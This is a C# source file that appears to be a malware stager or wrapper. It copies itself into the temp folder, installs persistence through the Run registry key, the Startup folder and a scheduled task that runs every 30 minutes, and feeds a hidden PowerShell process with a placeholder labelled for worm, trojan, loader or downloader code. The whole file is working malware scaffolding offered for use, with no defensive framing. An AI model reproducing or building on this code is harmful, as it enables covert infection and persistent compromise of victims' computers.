using System;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace PSCodeContainer
{
    /*
     * Author : Suleiman Al-Othman (@sulealothman)
     * ClassName : PSCodeContainer
     * Ver. : 0.1
     */
    class PSCodeContainer
    {

        static void Main()
        {
            bool instance;
            var vmt = new System.Threading.Mutex(true, System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, out instance);
            if (instance == false)
            {
                ProjectData.EndApp();
            }

            install();

            Process pro = new Process();
            pro.StartInfo.RedirectStandardInput = true;
            pro.StartInfo.FileName = "powershell.exe";
            pro.StartInfo.UseShellExecute = false;
            pro.StartInfo.CreateNoWindow = true;
            pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            pro.Start();
            pro.StandardInput.WriteLine(@"[POWERSHELL_CODE|WORM|TROJAN|LOADER|DOWNLOADER]");
        }


        private static void install()
        {
            try {
                if (!System.IO.File.Exists(Interaction.Environ("temp") + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName)) {
                    System.IO.File.WriteAllBytes(Interaction.Environ("temp") + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, System.IO.File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location));
                    System.Diagnostics.Process.Start(Interaction.Environ("temp") + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
                    ProjectData.EndApp();
                }
            } catch { ProjectData.EndApp(); }

            try {
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
            } catch { }

            try  {
                System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, System.IO.File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location));
            } catch {}

            try {
                Interaction.Shell("schtasks /create /sc minute /mo 30 /tn ScheduleName /tr \"" + System.Reflection.Assembly.GetExecutingAssembly().Location, AppWinStyle.Hide, false, -1);
            } catch {}
            System.Threading.Thread.Sleep(1000);

        }

    }
}
